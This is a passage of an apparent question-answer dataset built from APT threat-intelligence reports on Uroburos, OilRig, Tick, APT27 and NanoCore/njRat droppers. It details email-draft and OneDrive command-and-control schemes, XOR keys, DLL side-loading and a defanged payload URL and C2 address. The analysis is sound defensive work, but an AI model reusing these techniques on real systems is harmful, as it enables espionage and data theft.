contained malicious code and infected the military's network.\nThe following leads make us link what we discovered during our analysis with the cyber-attack carried out in 2008:\n\uf0b1 the usage of the same obfuscation key in Uroburos and Agent.BTZ (1dM3uu4j7Fw4sjnbcwlDqet4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f 5cvd0fk6c1a0s)\n\uf0b1 the usage of the same file name to store logs: winview.ocx\n\uf0b1 Uroburos actually checks whether Agent.BTZ is already present on the attacked system, before its installation. In case Agent.BTZ is installed, Uroburos will not be installed on the system.\n\uf0b1 the usage of Russian language in both codes\nIn an article published by Reuters, in 2011, the journalist mentioned that \"U.S. government strongly suspects that the original attack was crafted by Russian Intelligence.\"5 (<>)We found Uroburos samples with a resource in Russian language:\nIn case someone from the audience of this report notices an infection caused by the Uroburos rootkit and needs help, would like to receive further technical information or would like to contribute any information about this case, please feel free to contact us by email using the following mailbox:\n4 http://en.wikipedia.org/wiki/2008_cyberattack_on_United_States\n5 http://www.reuters.com/article/2011/06/17/us-usa-cybersecurity-worm-idUSTRE75F5TB20110617\nBig Headline: Conclusion\nThe Uroburos rootkit is one of the most advanced rootkits we have ever analyzed. The oldest driver we identified was compiled in 2011, which means that the campaign remained undiscovered for at least three years.\nThe investment to develop a complete framework such as Uroburos is extremely high. The developer team behind the development and the design of such an enhanced framework is really skilled. We believe that, until today, the team behind Uroburos has developed an even more sophisticated framework, which still remains undiscovered.\nThe design is highly professional; the fact the attackers use a driver and a virtual file system in two separate files which can only work in combination, makes the analysis really complicated. One needs to have the two components to correctly analyze the framework. The driver contains all of the necessary functionality and the file system alone simply cannot be decrypted.\nThe network design is extraordinarily efficient, too; for an incident response team, it is always complicated to deal with peer-to-peer infrastructure. It is also hard to handle passive nodes, because one cannot quickly identify the link between the different infected machines.\nThis kind of data stealing software is too expensive to be used as common spyware. We assume that the attackers reserve the Uroburos framework for dedicated and critical targets. This is the main reason why the rootkit was only detected many years after the suspected first infection. Furthermore, we assume that the framework is designed to perform cyber espionage within governments and high profile enterprises but, due to its modularity, it can be easily extended to gain new features and perform further attacks as long as it remains undetected within its target.\nThere are some strong indications which suggest that the group behind Uroburos is the same as the one behind Agent.BTZ, which allegedly was part of an intelligence agency cyberattack targeting US military bases in 2008. Notable hints include the usage of the exact same encryption key then and now, as well as the presence of Russian language in both cases.\n\nWhat specific technical indicators link the Uroburos rootkit to the 2008 cyber-attack against the United States involving Agent.BTZ, and how do these indicators support the attribution?",
    "output": "Several technical indicators link the Uroburos rootkit to the 2008 cyber-attack involving Agent.BTZ. These include the usage of the same obfuscation key in both Uroburos and Agent.BTZ, the usage of the same file name (winview.ocx) to store logs, and the fact that Uroburos checks for the presence of Agent.BTZ on the attacked system before installing itself. Additionally, both codes contain Russian language elements. These indicators support the attribution by providing concrete evidence of shared techniques and tools, suggesting that the group behind Uroburos is likely the same as the one behind Agent.BTZ.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Background\nIn early September 2023, CERT-UA APT28 was attempting to use new malware named Headlace to access a critical energy infrastructure entity in Ukraine. This involved APT28 using the Mockbin and Mocky API websites to stage malicious archives retrieved by Javascript droppers. In late September 2023, Zscaler a similar campaign targeting the theft of NTLM hashes from victims in Poland, Austria and Belgium by using adult-themed lures and the Mockbin API for data extraction.\nIn late 2023, X-Force uncovered eight lure documents created between early August and early December 2023 likely leveraged in crafted to ultimately distribute ITG05's Headlace backdoor. X-Force research confirmed the majority of the files are directly derived from publicly available official documents created by the Bank of Israel, the U.S. Congressional Research Service, the United Nations, the European Parliament, the French digital education service Cahier de Pr\u00e9pa and the Ukraine-based Razumkov Centre think tank.\nThe remaining lures appear to be internal documents belonging to, or associated with, what appears to be legal amendments to a Turkish manual regarding technical installations, and interstate agreements facilitated by the Joint Intergovernmental Commission between the Republic of Azerbaijan and\nthe Republic of Belarus on Economic Cooperation. Of note, the majority of the lure documents contents feature news, updates or information regarding developments in Ukraine and the Levant.\nThe use of official documents as lure material is a departure from ITG05 activity featuring the delivery of the Headlace backdoor, which featured adult-themed material to engender victim engagement. This change in lure content may be indicative of ITG05's increased emphasis on a unique target audience whose interests would prompt interaction with material impacting emerging policy creation. State-sponsored cyber capabilities will likely continue to be leveraged to furnish domestic decision-makers with exclusive access to the political resolve and resource priorities of the IC and individual states.\n\nAnswer this question based on the above context: Why did ITG05 shift from using adult-themed material to official documents as lure content for delivering the Headlace backdoor? How does this change reflect on their targeting strategy and potential objectives?",
    "output": "ITG05 shifted from using adult-themed material to official documents as lure content to better engage a unique target audience interested in policy creation and political developments. This change suggests an increased emphasis on targeting individuals who are likely to interact with material that impacts emerging policies. By using documents from reputable sources such as the Bank of Israel, the U.S. Congressional Research Service, and the United Nations, ITG05 aims to attract victims who are involved in decision-making processes or have access to sensitive information. This strategy aligns with the objective of state-sponsored cyber capabilities to provide domestic decision-makers with exclusive insights into the political resolve and resource priorities of international communities and individual states.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: C&C and exfiltration protocol\nIn all versions, the SC5k downloader repeatedly logs into a remote Exchange server using the (<https://learn.microsoft.com/en-us/dotnet/api/microsoft.exchange.webservices.data.exchangeservice?view=exchange-ews-api>)ExchangeService .NET class in the (<https://docs.microsoft.com/en-us/dotnet/api/microsoft.exchange.webservices.data?view=exchange-ews-api>)Microsoft.Exchange.WebServices.Data namespace to interact with the EWS API. Once connected, SC5k reads email messages with attachments in the Drafts directory to extract attacker commands and additional payloads. Conversely, in each connection, SC5k exfiltrates files from a local staging directory by creating new email drafts in the same email account. The path to the staging directory varies across samples.\nOf interest is the way both the operators and various instances of this downloader can distinguish between the different types of drafts in the shared email account. For one, each email draft has a <victimID> incorporated, which allows the same Exchange account to be used for multiple OilRig victims:\nFor v1 and v2, the downloader transmits the <victimID> as a custom attribute of the email draft via the (<https://learn.microsoft.com/en-us/dotnet/api/microsoft.exchange.webservices.data.item.setextendedproperty?view=exchange-ews-api>)SetExtendedProperty method.\nFor v3, the downloader incorporates the <victimID> into the From field of the email draft.\nThe <victimID> is typically generated using the compromised system's information, such as the system volume ID or the computer name, as shown in Figure 2.\nFurthermore, various email properties can be used to distinguish between messages created by the operators (commands, additional payloads) and messages created by the malware instances (command outputs, exfiltrated files). SC5k v1 and v2 use file extensions (of the draft attachments) to make that distinction, while SC5k v3 uses the From and MailItem.Categories fields of the email draft to distinguish between various actions. At each point, the email drafts in the shared email account can serve various purposes, as summarized in Table 2 and explained below. Note that the email addresses used in the From field are not genuine; because SC5k never sends out any actual email messages, these attributes are only used to distinguish between different malicious actions.\nTable 2. Types of email messages used by SC5k v3 for C&C communications\nMore specifically, SC5k v3 processes (and then deletes) those email messages from the shared Exchange account that have the From field set to <victimID>@outlook.com, and distinguishes between commands and additional payloads by the message category (MailItem.Categories):\nFor payloads, the attached file is XOR decrypted using the hardcoded key &5z, then gzip decompressed and dumped in the working directory.\nFor shell commands, the draft attachment is base64 decoded, XOR decrypted, and then executed locally using cmd.exe or, in the case of SC5k v3, using a custom command interpreter located under the name <baseDirectory>\\*Ext.dll. This file is then loaded via Assembly.LoadFrom, and its extend method invoked with the command passed as an argument.\nTo communicate with the attackers, SC5k v3 creates draft messages with a different From field: <victimID>@aol.com. Attached to these messages are outputs of previously received commands, or contents of the local staging directory. Files are always gzip compressed and XOR encrypted before being uploaded to the shared mailbox, while shell commands and command outputs are XOR encrypted and base64 encoded.\nFinally, SC5k v3 repeatedly creates a new draft on the shared Exchange account with the From field set to <victimID>@yahoo.com, to indicate to the attackers that this downloader instance is still active. This keep-alive message, whose construction is shown in Figure 3, has no attachment and is renewed with each connection to the remote Exchange server.\nMedium Headline: Other OilRig tools using email-based C&C protocol\nBesides SC5k, other notable OilRig tools have been discovered subsequently (in 2022 and 2023) that abuse APIs of legitimate cloud-based email services for exfiltration and both directions of their C&C communication.\nOilCheck, a C#/.NET downloader discovered in April 2022, also uses draft messages created in a shared email account for both directions of the C&C communication. Unlike SC5k, OilCheck uses the (<https://learn.microsoft.com/en-us/graph/use-the-api>)REST-based Microsoft Graph API to access a shared Microsoft Office 365 Outlook email account, not the . While SC5k uses the built-in (<https://learn.microsoft.com/en-us/dotnet/api/microsoft.exchange.webservices.data.exchangeservice?view=exchange-ews-api>)ExchangeService .NET class to create the API requests transparently, OilCheck builds the API requests manually. The main characteristics of OilCheck are summarized in Table 1 above.\nEarlier in 2023, two other OilRig backdoors were publicly documented: MrPerfectionManager (, February 2023) and PowerExchange ((<https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/crambus-middle-east-government>)Symantec, October 2023), both using email-based C&C protocols to exfiltrate data. A notable difference between these tools and OilRig's downloaders studied in this blogpost is that the former use the victimized organization's Exchange server to transmit email messages from and to the attacker's email account. In contrast: with SC5k and OilCheck, both the malware and the operator accessed the same Exchange account and communicated by creating email drafts, never sending an actual message.\nIn any case, the new findings confirm the trend of OilRig shifting away from the previously used HTTP/DNS-based protocols to using legitimate cloud service providers as a way to hide its malicious communication and to mask the group's network infrastructure, while still experimenting with various flavors of such alternative protocols.\nMedium Headline: OilBooster downloader\nOilBooster is a 64-bit portable executable (PE) written in Microsoft Visual C/C++ with statically linked OpenSSL and Boost libraries (hence the name). Like OilCheck, it uses the (<https://learn.microsoft.com/en-us/graph/api/overview?view=graph-rest-1.0>)Microsoft Graph API to connect to a Microsoft Office 365 account. Unlike OilCheck, it uses this API to interact with a OneDrive (not Outlook) account controlled by the attackers for C&C communication and exfiltration. OilBooster can download files from the remote server, execute files and shell commands, and exfiltrate the results.\nBig Headline: Overview\nUpon execution, OilBooster hides its console window (via the ShowWindow API) and verifies that it was executed with a command line argument; otherwise it terminates immediately.\nOilBooster then builds a <victimID> by combining the compromised computer's hostname and username: <hostname>-<username>. This identifier is later used in the C&C communication: OilBooster creates a specific subdirectory on the shared OneDrive account for each victim, which is then used to store backdoor commands and additional payloads (uploaded by the operators), command results, and exfiltrated data (uploaded by the malware). This way, the same OneDrive account can be shared by multiple victims.\nFigure 4 shows the structure of the shared OneDrive account and the local working directory, and summarizes the C&C protocol.\nAs shown in Figure 4, the OilRig operator uploads backdoor commands and additional payloads to the victim-specific directory on OneDrive, as files with the .doc and .docx extensions, respectively. On the other end of the C&C protocol, OilBooster uploads command results and exfiltrated data as files with the .xls and .xlsx extensions, respectively. Note that these are not genuine Microsoft Office files, but rather JSON files with XOR-encrypted and base64-encoded values.\nFigure 5 shows OilBooster spawning instances of two threads in an indefinite loop, sleeping for 153,123 milliseconds after each iteration:\nBoth threads interact with the shared OneDrive account:\n1. A downloader thread handles C&C communication and executes downloaded payloads.\n2. An exfiltration thread exfiltrates data from the local staging directory.\nThe downloader thread connects to the attacker-controlled OneDrive account and iterates through all files with the .doc and .docx extensions, which are then downloaded, decrypted, and parsed in order to extract and execute additional payloads on the compromised host. A local subdirectory named items in the current working directory (where OilBooster is deployed) is used to store the downloaded files. As shown in Figure 6, each connection attempt is handled in a separate thread instance, launched once every 53,123 milliseconds.\nThe exfiltration thread iterates over another local subdirectory, named tempFiles, and exfiltrates its contents to the shared OneDrive account, which are uploaded there as individual files with the .xlsx extension. The staging directory is cleared this way once every 43,123 milliseconds in a separate thread instance, as also seen in Figure 6.\nQ: How does OilBooster utilize the Microsoft Graph API for C&C communication and exfiltration, and what file extensions are used for different types of data?",
    "output": "OilBooster uses the Microsoft Graph API to connect to a Microsoft Office 365 OneDrive account controlled by the attackers for C&C communication and exfiltration. It creates a specific subdirectory on the shared OneDrive account for each victim, identified by a <victimID> composed of the compromised computer's hostname and username. The attackers upload backdoor commands and additional payloads as files with the .doc and .docx extensions, respectively. OilBooster uploads command results and exfiltrated data as files with the .xls and .xlsx extensions, respectively. These files are not genuine Microsoft Office files but rather JSON files with XOR-encrypted and base64-encoded values.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: More about the DLP company compromise\nIn this section, we provide more details about tools and malware families that Tick deployed in the compromised software company's network.\nTo maintain persistent access, the attackers deployed malicious loader DLLs along with legitimate signed applications vulnerable to DLL search-order hijacking. The purpose of these DLLs is to decode and inject a payload into a designated process (in all cases of this incident, all loaders were configured to inject into svchost.exe).\nThe payload in each loader is one of three malware families: ShadowPy, Ghostdown, or Netboy. Figure 6 illustrates the loading process.\nIn this report we will focus on analyzing the ShadowPy downloader and Netboy backdoor.\nSmall Headline: Custom py2exe loader\nAs previously described, the malicious DLL loader is launched via DLL side-loading; in the case of ShadowPy we observed vssapi.dll being side-loaded by avshadow.exe, a legitimate software component from the Avira security software suite.\nThe malicious DLL contains, encrypted in its overlay, three major components: the py2exe custom loader, the Python engine and the PYC code. First, the DLL loader code locates the custom py2exe loader in its overlay and decrypts it using a NULL-preserving XOR using 0x56 as the key, then it loads it in memory and injects it in a new svchost.exe process that it creates. Then the entry point of the custom py2exe loader is executed on the remote process.The difference between the original py2exe loader code and the customized version used by Tick, is that the custom loader reads the contents of the malicious vssapi.dll from disk and searches for the Python engine and the PYC code in the overlay, whereas (<https://github.com/py2exe/py2exe/blob/7ebb29c1dc2ae08516cde2a9feca4d8517233ef7/source/start.c#L116>)the original locates the engine and the PYC code in the resource section.\nThe loading chain is illustrated in Figure 7.\n\nHow does the Tick APT group achieve persistence in a compromised network through the use of malicious loader DLLs, and what specific modifications were made to the py2exe loader to facilitate the injection of the ShadowPy downloader?",
    "output": "A: The Tick APT group achieves persistence in a compromised network by deploying malicious loader DLLs along with legitimate signed applications that are vulnerable to DLL search-order hijacking. These DLLs are designed to decode and inject a payload into a designated process, specifically svchost.exe in this case. The payload can be one of three malware families: ShadowPy, Ghostdown, or Netboy. For the ShadowPy downloader, the malicious DLL loader is launched via DLL side-loading. In this instance, vssapi.dll is side-loaded by avshadow.exe, a legitimate component from the Avira security software suite. The malicious DLL contains three major components encrypted in its overlay: the py2exe custom loader, the Python engine, and the PYC code. The DLL loader code first locates the custom py2exe loader in its overlay, decrypts it using a NULL-preserving XOR with 0x56 as the key, and then loads it into memory, injecting it into a new svchost.exe process. The entry point of the custom py2exe loader is then executed on the remote process. The custom loader differs from the original py2exe loader in that it reads the contents of the malicious vssapi.dll from disk and searches for the Python engine and the PYC code in the overlay, whereas the original locates these components in the resource section.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 2 Russian Cyber Strategy\nToday, how is this Clausewitzian-inspired Russian strategic imagination being applied to the use of cyber power? The answer can be found by first exploring the strategic challenge they apparently believe they face: the NATO alliance. NATO is based on the concept of collective defence that enhances its strategy of deterrence. Through formal agreements and long-standing and extensive collaboration, NATO sends a strong signal that member states will stand together in the face of threats to collectively deter aggression against its members. The objective of this deterrent policy is to preserve the peace. This is a key observation. The goal of NATO's deterrent strategy is to reduce or even eliminate the possibility of war by ensuring that aggressors understand ex ante that an attack against one of its members is an attack against the entire Alliance. Especially today, NATO primarily exists to prevent war, not to develop enhanced strategies or capabilities to prosecute war or to wield forces to achieve ancillary objectives. In a sense, NATO exists to preserve the peace and to make sure that changes to the status quo in Europe occur through political processes that lead to the spread of democracy, the rule of law, and adherence to international norms. The raison d'\u00eatre of NATO is to preserve the peace; the purpose behind its strategy is to deter war.\nRussia opted to pick a course of action not to defeat NATO, but NATO's strategy.\nTo achieve its objective \u2013 rapid change of the European status quo to better fit their Russia-centric, not democratically-cantered, interests and preferences \u2013 Russia opted to pick a course of action not to defeat NATO, but to defeat NATO's strategy. By presenting the Western alliance with a fait accompli through actions that produce minimal death and destruction, Russia attempted to shift the onus of escalation onto NATO, thereby inflicting a strategic defeat on the Alliance at the outset of hostilities or even in the event of non-democratic changes to the status quo. Russia is banking on the hope that NATO will either be incapable or unwilling to transform this strategic defeat into active conventional combat, which would further undermine NATO's goal of preserving the peace. In effect, the Russians seem to have realised that by defeating NATO's strategy at the outset of a confrontation, they can actually alter political perceptions within the Alliance in a way that suits their objectives. Put somewhat differently, the risk of a forceful NATO response to some provocation is minimised by keeping the death and destruction associated with any fait accompli to an absolute minimum. NATO is especially vulnerable to cyberattacks and information warfare because Russia can undermine NATO's deterrent strategy without causing casualties. NATO has the option of reversing the fait accompli, but the required level of death and destruction simply highlights the failure of its deterrent strategy.\nCyber power, as a key facet of hybrid warfare, is an important enabler in an attack on NATO's deterrent strategy.12 Cyber attacks are not specifically targeted to eliminate key nodes, but to intensify the fog of war by sowing confusion within command and control networks and NATO polities. For instance, according to press reports, Russian movement into the Ukraine was accompanied by myriad cyber attacks, including Distributed Denial of Service (DDoS) tactics against computers in Kyiv, Poland, the European Parliament, and the European Commission.13 If local political and military leaders cannot develop an accurate estimate of quickly developing events, critical hours or even days can be gained with which Russia can create facts on the ground that can only be reversed at great effort. A little bit of 'sand in the works', so to speak, is enough to further delay the relatively slow-pace of decision-making in the West.14\nCyber power is an important enabler in an attack on NATO's deterrent strategy.\nThe annexation of Crimea also began with a series of covert operations that used a disinformation campaign to create ambiguity and delay Ukraine's response, effectively extending the element of surprise achieved by the Russian gambit. According to Michael Kofman and Matthew Rohansky:\n'Russia's use of broadcast tools for propaganda and psychological operations, part of a broader information campaign to support the Crimean annexation, caught both the Ukraine and the West by surprise. Moscow amped up the alarmist content of its broadcasting . . . stoking fear and confusion in Crimea'.15\nAdmittedly, the annexation was completed using more traditional operations involving conventional units, but the cyber-enabled opening moves not only allowed Russia to test the Western response, but to buy the time needed to create a fait accompli through conventional means.\nWestern analysts have noted that even though the Crimea crisis surprised the West, the Russian effort to integrate television and the internet, especially various\ntypes of social media, into its effort to shape opponents' political perspectives, has been ongoing for quite some time. In a sense, Russia has worked hard to use the internet to shape the political environment of conflict: it has (1) developed internally and externally focused media with a significant online presence; (2) used social media to guarantee that Russian narratives reach the broadest possible audience; and (3) polished their content in terms of language and presentation so that it rings true in various cultural settings.16 These activities have recently been given their own moniker \u2013 trolling \u2013 the practice of creating cyber actors with false identities to communicate tailored messages to an unsuspecting audience.17 According to Keir Giles:\n12 As Michael Kofman and Matthew Rojansky note, 'hybrid warfare,' including the Russian variations used against the Ukraine is not unique. The point here, however, is that Russia is particularly adept as using cyber power in the practice of hybrid warfare; see Kofman and Rojansky, (op cit) p. 2. Other analysts have noted how the Crimea annexation and the additional actions against Ukraine were dependant on capabilities long under development that were especially crafted not to trigger a NATO response; Aleksandr Golts and Heidi Reisinger. 'Russia's Hybrid Warfare: Waging War below the Radar of Traditional Collective Defence,' Research Paper No 105 (Research Division \u2013 NATO Defence College Rome) November 2014.\n13 Owen Matthews. 'BIG READ: Russia leading the way in the cyber arms race,' Irish Examiner, Saturday June 13, 2015. www. irishexaminer.com'lifestyle'feature'big-read-russia-leading-the-way-in-the-cyber-arms-race-336675.html.\n14 The key point is that information denial or dominance does not have to be absolute, it just needs to foster delay and uncertainty in Western political and military decision-making. According to Paul Saunders, 'Russia's seizure of Crimea happened very quickly. U.S. and European decision-making processes just don't move at that speed, particularly when facing ambiguity. Once a Crimea-style operation has begun, it will be extremely difficult if not impossible for Western decision-makers to be sufficiently confident about the other side's intent to take consequential action before it's too late'; Saunders, P. 'Why America Can't Stop Russia's Hybrid Warfare,' The National Interest June 23, 2015. www.nationalinterest.org/feature/shy-america-can't-stop-russias-hybrid-warfare-13166.\n15 Kofman and Rojansky, p. 4.\n'Russian assessments of current events makes it clear that Russia considers itself to be engaged in full-scale information warfare, involving not only offensive but defensive operations \u2013 whether or not its notional adversaries have actually noticed this is happening'.18\nWhat most analysts fail to realise, however, is that Moscow has shaped this cyber-enabled information warfare in a very strategic manner. Cyber power is being wielded as a strategic weapon to create facts on the ground with the minimal use of kinetic force.\nQuestion: Why is Russia's use of cyber-enabled information warfare considered strategic, and what are the implications for NATO's response mechanisms?",
    "output": "Answer: Russia's use of cyber-enabled information warfare is considered strategic because it is wielded as a weapon to create facts on the ground with minimal use of kinetic force. This approach is designed to test the Western response and buy time needed to achieve objectives through conventional means. The implications for NATO's response mechanisms are significant, as the relatively slow pace of decision-making in the West can be further delayed by the 'sand in the works' created by cyber attacks, making it difficult for NATO to reverse the fait accompli without significant effort.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Sachverhalt\nDem Bundesamt f\u00fcr Verfassungsschutz (BfV) liegen Erkenntnisse \u00fcber eine anhaltende Cyberspionagekampagne durch die Cyberangriffsgruppierung APT27 unter Einsatz der Schadsoftwarevariante HYPERBRO gegen deutsche Wirtschaftsunternehmen vor. Nach aktuellen Erkenntnissen nutzen die Angreifer seit M\u00e4rz 2021 Schwachstellen in Microsoft Exchange sowie in der Software Zoho AdSelf Service Plus1 als Einfallstor f\u00fcr die Angriffe aus.\nEs kann nicht ausgeschlossen werden, dass die Akteure neben dem Diebstahl von Gesch\u00e4ftsgeheimnissen und geistigem Eigentum versuchen, die Netzwerke der (Unternehmens-)Kunden beziehungsweise von Dienstleistern zus\u00e4tzlich zu infiltrieren (Supply-Chain-Angriff).\n1 Bei dem Programm handelt es sich um ein webbasierte Software zur Verwaltung von Zugangsdaten von Cloud- und Windows Active Directory-Konten\n\nQuestion: Why did APT27 choose to exploit vulnerabilities in Microsoft Exchange and Zoho AdSelf Service Plus software for their cyberspionage campaign against German businesses? How does this strategy potentially enhance their ability to conduct supply chain attacks?\n\nAnswer:",
    "output": "APT27 chose to exploit vulnerabilities in Microsoft Exchange and Zoho AdSelf Service Plus software because these platforms are widely used by businesses and provide critical services related to email communication and user account management. By targeting these systems, APT27 gains access to sensitive information and can potentially compromise multiple accounts and services within the targeted organizations. This strategy enhances their ability to conduct supply chain attacks by allowing them to infiltrate not only the primary target but also the networks of associated customers and service providers, thereby expanding the scope of their espionage activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: Explain how the SloughRAT implant communicates with its C2 server, including the types of URLs used, the format of the data sent, and the commands it can receive from the server.",
    "output": "The SloughRAT implant uses two different URLs for communication with the C2 server. One URL is used to register the implant and request arbitrary commands from the C2, while the other is used to POST the results of the commands executed on the infected endpoint. Communication is done using the ServerXMLHTTP from the MSXML2 API to instrument an HTTP POST request. Data sent to the C2 server is in the format of HTTP forms with relevant headers like Content-Type, Content-Length, and CharSet. The implant sends system information to the first C2 URL, and the server returns a UID. This UID is then used to request commands from the C2. Commands received from the C2 server can be 'ok' (do nothing and send the UID again), '401' (clean the UID variable and request another UID), or a command to execute using the command line utility. The output of the command is recorded in a temporary file and sent back to the C2.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Acknowledgements\nWe thank Noura Al-Ameer for collaborating with this investigation, and for graciously agreeing to be included in this report. The targeted nature of many cases means that, without the help of brave targets and victims, we are often left with a very limited view of what is taking place.\nWe are exceptionally grateful to colleagues at Citizen Lab for comments, critical feedback, and assistance with document preparation including Ron Deibert, Bill Marczak, Morgan Marquis-Boire, Sarah McKune, Masashi Nishihata, Irene Poetranto,Christine Schoellhorn, and Adam Senft.\nThanks also to Justin Kosslyn and Brandon Dixon for helpful feedback.\nWe would also like to thank the following teams: Lookout, PassiveTotal and RiskIQ, VirusTotal, and Cisco's AMP Threat Grid Team for data correlation.\nVery special thanks to other investigators who wished to remain anonymous but provided exceptionally helpful assistance, especially TNG and Tuka.\nMedium Headline: Dropper Doc 1 (From E-mail 1)\nAssadcrimes.ppsx\nMD5: 76F8142B4E52C671871B3DF87F10C30C\nThis slideshow deploys its malicious payload by (ab)using the OLE object embedding capabilities of PowerPoint.Specifically, the malware executable is embedded into the slideshow as an OLE Object of type Package:\nOnce embedded, the slideshow \"Animation\" feature is used to trigger the execution of the object immediately upon viewing the first slide.\nIn one of the malicious PPSX files, we can see the embedded package object by viewing the slides in normal view mode:\nOnce activated, the embedded object is saved to disk as %TEMP%\\putty.exe, and then executed. This executable is a .Net downloader.\nIn Figure 20 we can see that the second stage payload is obtained from the URL http://assadcrimes[.]info/1/dvm.exe [Ref 1]. This second stage executable is saved to disk as %temp%\\dwm.exe [Ref 2], and then executed [Ref 3].\nThe %temp%\\dwm.exe file has the following hashes:\nThe malware downloaded and executed by the .Net downloader is NanoCore, a well-known RAT (Remote Access Trojan) that enables the remote monitoring of victims via their computers. The NanoCore binary is wrapped using several layers of code obfuscation, which we describe in detail below.\nMedium Headline: Unpacking\nThe packer used on this executable employs a simple technique of base64 encoding the PE file and breaking it up into numerous lines which are then embedded into the resource section of the .Net packer stub file. At runtime, the packer reverses this process, then invokes the resulting .Net assembly from memory.\nExtracting this packed code reveals a .Net assembly which is yet another layer of code protection applied using a 'crypter'. This binary has the following hashes:\nMedium Headline: Decrypting\nThis executable is stub code which performs in-memory AES decryption of a base64 encoded string variable. This string variable holds an encrypted copy of the NanoCore RAT binary.\nThis encryption of the underlying malware is typically employed to bypass detection by endpoint security controls such as antivirus programs. Many 'crypter' tools, as they are known, are available for purchase or trade on various hacking forums.\nOf particular note, this decrypting stub code retained its PDB (short for Program Database) information. PDB file references are common in .Net applications when compiled in 'debug' mode, and they frequently reveal the original file path of the application source code on the developer's computer.\nThis executable revealed the following PDB file path:\nc:\\users\\mr.tekide\\documents\\visual studio 2013\\projects\\paccryptnano core dehgani -vds\\windowsapplication2\\obj\\debug\\launch manager.pdb\nThis PDB string indicates that 'mr.tekide' was the username of the developer who compiled this particular stub, and further that it was compiled as part of a Visual Studio project named 'paccryptnano core dehgani -vds'. In addition, a single subroutine found inside the decrypting stub was named 'tekide'. The relevance of this PDB string was discussed above in Part 5: Attribution.\nIn order to obtain the intended malware payload from this decrypting stub executable, we created a small .Net application to mimic the decryption steps and output the file to disk. Once complete, we obtained a malicious executable with hashes:\nMedium Headline: Original NanoCore binary\nNow that we have arrived at the original NanoCore binary, we can examine the configuration as specified by the operator. In order to extract the configuration settings from this copy of NanoCore, we used Kevin Breen's (<https://github.com/kevthehermit/RATDecoders>)RATDecoders.\nUsing Breen's tool we arrived at the following configuration:\nNotably, 88.198.222[.]163 port 8081 is the command and control channel for this malware. As noted in Part 1, the same IP was also present in the seeding e-mail header.\nMedium Headline: Dropper Doc 2\nassadcrimes1.ppsx\nMD5:F1F84EA3229DCA0CCACB7381A2F49F99\nThis PowerPoint document leverages CVE-2014-4114, a vulnerability in the OLE packager component of the Windows operating system. As described in (<https://citizenlab.org/2015/06/targeted-attacks-against-tibetan-and-hong-kong-groups-exploiting-cve-2014-4114/>)previous reporting, this vulnerability causes a file embedded within the PowerPoint document to be copied to disk and executed silently on vulnerable systems.\nThe document under examination drops a file named dvm.gif to disk, renames it to dvm.exe and then executes it. This dvm.exe is the same packed and crypted copy of NanoCore as retrieved and executed by the .Net downloader described in the previous section.\nMedium Headline: Dropper Doc 3\nassadcrimes.info.ppsx\nMD5: 30BB678DB3AD0140FC33ACD9803385C3\nThis malicious PowerPoint document uses the same weaponization method described above with respect to Dropper Doc 1. The executable is embedded as an OLE package object, and subsequently executed using animation actions within the PowerPoint slideshow.\nAs with Dropper Doc 1, activation of the OLE Package object saves the embedded executable to disk as %TEMP%\\putty.exe, then executes it. This file is a .Net application employing the same layers and methods of packing and crypting as seen in the payloads delivered by Dropper Docs 1 and 2. However, the ultimate malware payload in this case is njRat, another well-known RAT tool.\nAfter unpacking the OLE embedded executable putty.exe, we again arrive at a decrypting stub file which will AES decrypt a base64 string variable and run it from memory. The hashes of this file are:\nSimilar to the case of Dropper Doc 1 above, we find a PDB entry present in the decrypting stub executable:\nC:\\Users\\mr.tekide\\Documents\\Visual Studio\n2013\\Projects\\paccrypt11njratmalii\\paccryptalipnahzade\\obj\\Debug\\LManager.pdb\nAgain we can observe the same username of 'mr.tekide' in the project source code path within the PDB string. Further, we note the development path components paccrypt11njratmalii and paccryptalipnahzade.\nTo obtain the malicious njRat executable from this decrypting stub we used the same .Net program we built for use in the Dropper Doc 1 example above. The resulting njRat binary had the following hashes:\nInterestingly, the njRat executable appears to have been compiled from source by the same user who compiled the crypter described above. Note the PDB strings found inside the njRat executable:\nC:\\Users\\mr.tekide\\Documents\\Visual Studio 2013\\Projects\\njrat7stubsoures \u2013\nCopy\\njrat7stubsoures\\obj\\Debug\\dvvm.pdb\nA quick look at the configuration data embedded within this njRat binary reveals the command and control IP address and port:\n\nWhat is the purpose of the .Net downloader in the Assadcrimes.ppsx malware, and how does it retrieve and execute the second stage payload?",
    "output": "The purpose of the .Net downloader in the Assadcrimes.ppsx malware is to retrieve and execute the second stage payload. The .Net downloader obtains the second stage payload from the URL http://assadcrimes[.]info/1/dvm.exe. This second stage executable is saved to disk as %temp%\\dwm.exe and then executed. The second stage payload is NanoCore, a well-known Remote Access Trojan (RAT) that enables the remote monitoring of victims via their computers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Section 3: Incident Inter-Relationships\nThere are a number of domains and IP addresses that have been tied to the previously mentioned incidents. Toward the beginning of the report it was stated that we believed all of these incidents to be related. As has already been seen, there are some similarities across the incidents, such as same victim organization, similar beaconing data blocks, and infection believed to be from malicious email attachments.  However, the strongest evidence for their relationship is the fact that related domains and IPs are used for C&Cs across these incidents.\nThe following Figure 3 - Link-Graph of \"1.php\" Incident Inter-Relationship provides this illustration with only a small snippet of information from these incidents:\nBig Headline: 3.1 Possible Relationship to Other APT Incidents\nPast experience with APT-style incidents show that hostnames may be used to identify the C&C for particular victims of interest.  For example, in bakerhughes.thruthere.net9  was a C&C used against Baker Hughes in the disclosed Night Dragon10  attacks. There have been a number of interesting hostnames used with \"1.php\" C&C domains that may indicate other potential victims. These hostnames potentially identify victims within the US Government (USG), Defense Industrial Base (DIB), and Geospatial industry. The above link-graph provides one example of such an entity that has information about its attacks already disclosed in the open-source (QinetiQ).\n\"QINETIQ\" or \"QNAO\" (QinetiQ North America Operations) 